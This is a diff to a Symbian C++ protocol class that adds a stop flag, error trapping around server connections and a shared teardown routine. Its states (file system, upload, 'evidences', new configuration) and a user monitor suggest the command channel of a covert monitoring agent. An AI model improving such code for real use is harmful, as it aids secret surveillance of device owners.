@@ -1,7 +1,7 @@
 /*
  ============================================================================
  Name		: Protocol.cpp
- Author	  : Marco Bellino
+ Author	  : Marco Bellino - rewritten by jo'
  Version	 : 1.0
  Copyright   : Your copyright notice
  Description : CProtocol implementation
@@ -31,13 +31,14 @@ CProtocol::CProtocol(MProtocolNotifier& aNotifier) :
 	iHost.Zero();
 	iCookie.Zero();
 	iSessionKey.Zero();
+	iStopped = EFalse;
 	}
 
 CProtocol::~CProtocol()
 	{
 	__FLOG(_L("Destructor"));
-	iStates.Close();
 	delete iCurrentState;
+	iStates.Close();
 	delete iNetwork;
 	delete iUserMonitor;
 	__FLOG(_L("EndDestructor"));
@@ -125,6 +126,9 @@ void CProtocol::SetAvailables(TInt aNumAvailables,const TDesC8& aAvailables)
 
 void CProtocol::ChangeStateL()
 	{
+	if(iStopped)
+		return;
+	
 	iNetwork->Disconnect();
 	
 	TInt state = GetNextState();
@@ -135,7 +139,11 @@ void CProtocol::ChangeStateL()
 			CAbstractState* ident = CStateIdentification::NewL(*this);
 			delete iCurrentState;
 			iCurrentState = ident;
-			iNetwork->ConnectToServerL(iServer,iPort);
+			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
+			if(err!=KErrNone)
+				{
+				EndProtocolL(err);
+				}
 			}
 			break;
 		case EState_NewConf:
@@ -143,7 +151,11 @@ void CProtocol::ChangeStateL()
 			CAbstractState* newConf = CStateNewConf::NewL(*this);
 			delete iCurrentState;
 			iCurrentState = newConf;
-			iNetwork->ConnectToServerL(iServer,iPort);
+			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
+			if(err!=KErrNone)
+				{
+				EndProtocolL(err);
+				}
 			}
 			break;
 		case EState_FileSystem:
@@ -151,7 +163,11 @@ void CProtocol::ChangeStateL()
 			CAbstractState* fileSystem = CStateFileSystem::NewL(*this);
 			delete iCurrentState;
 			iCurrentState = fileSystem;
-			iNetwork->ConnectToServerL(iServer,iPort);
+			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
+			if(err!=KErrNone)
+				{
+				EndProtocolL(err);
+				}
 			}
 			break;
 		case EState_Download:
@@ -159,7 +175,11 @@ void CProtocol::ChangeStateL()
 			CAbstractState* download = CStateDownload::NewL(*this);
 			delete iCurrentState;
 			iCurrentState = download;
-			iNetwork->ConnectToServerL(iServer,iPort);
+			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
+			if(err!=KErrNone)
+				{
+				EndProtocolL(err);
+				}
 			}
 			break;
 		case EState_Upload:
@@ -167,7 +187,11 @@ void CProtocol::ChangeStateL()
 			CAbstractState* upload = CStateUpload::NewL(*this);
 			delete iCurrentState;
 			iCurrentState = upload;
-			iNetwork->ConnectToServerL(iServer,iPort);
+			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
+			if(err!=KErrNone)
+				{
+				EndProtocolL(err);
+				}
 			}
 			break;
 		case EState_Evidences:
@@ -175,7 +199,11 @@ void CProtocol::ChangeStateL()
 			CAbstractState* evidences = CStateEvidences::NewL(*this);
 			delete iCurrentState;
 			iCurrentState = evidences;
-			iNetwork->ConnectToServerL(iServer,iPort);
+			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
+			if(err!=KErrNone)
+				{
+				EndProtocolL(err);
+				}
 			}
 			break;
 		case EState_Bye:
@@ -183,24 +211,21 @@ void CProtocol::ChangeStateL()
 			CAbstractState* bye = CStateBye::NewL(*this);
 			delete iCurrentState;
 			iCurrentState = bye;
-			iNetwork->ConnectToServerL(iServer,iPort);
+			TRAPD(err,iNetwork->ConnectToServerL(iServer,iPort));
+			if(err!=KErrNone)
+				{
+				EndProtocolL(err);
+				}
 			}
 			break;
 		case EState_None:
 			{
-			//stop monitoring
-			if(iUserMonitor)
-				{
-				delete iUserMonitor;
-				iUserMonitor = NULL;
-				}
-			//notify action
-			iNotifier.ConnectionTerminatedL(KErrNone);
+			EndProtocolL(KErrNone);
 			}
 			break;
 		default:
 			{
-			iNetwork->ConnectToServerL(iServer,iPort);
+			//iNetwork->ConnectToServerL(iServer,iPort);  //TODO:restore this if some problems arise
 			//TODO: think about
 			ChangeStateL();
 			}
@@ -211,6 +236,8 @@ void CProtocol::ChangeStateL()
 void CProtocol::SendStateDataL(const TDesC8& data)
 	{
 	__FLOG_1(_L("Outgoing Data State: %d"), iCurrentState->Type());
+	if(iStopped)
+		return;
 	iNetwork->SendL(data);
 	}
 
@@ -223,6 +250,8 @@ void CProtocol::NewConfigAvailable()
 void CProtocol::NotifyDataReceivedL(const TDesC8& aData)
 	{
 	__FLOG_1(_L("Incoming Data State: %d"), iCurrentState->Type());
+	if(iStopped)
+		return;
 	iCurrentState->ProcessDataL(aData);
 	}
 
@@ -245,8 +274,14 @@ void CProtocol::NotifyDisconnectionCompleteL()
 void CProtocol::NotifyNetworkError(TInt aError)
 	{
 	__FLOG_2(_L("Network Error:%d  State:%d"), aError, iCurrentState->Type());
-	//delete iCurrentState;
-	//iCurrentState = NULL;
+	iStopped = ETrue;
+	EndProtocolL(aError);
+	}
+
+void CProtocol::EndProtocolL(TInt aError)
+	{
+	delete iCurrentState;
+	iCurrentState = NULL;
 	if(iUserMonitor)
 		{
 		delete iUserMonitor;
@@ -272,12 +307,16 @@ void CProtocol::SetKey(const TDesC8& aKey)
 
 void CProtocol::ReConnect()
 	{
+	if(iStopped)
+		return;
 	iNetwork->Disconnect();
 	iNetwork->ConnectToServerL(iServer,iPort);
 	}
 
 void CProtocol::ResponseError(TInt aError)
 	{
+	if(iStopped)
+		return;
 	//with KErrAuth simply close connection
 	//with other errors send bye
 	switch(aError)
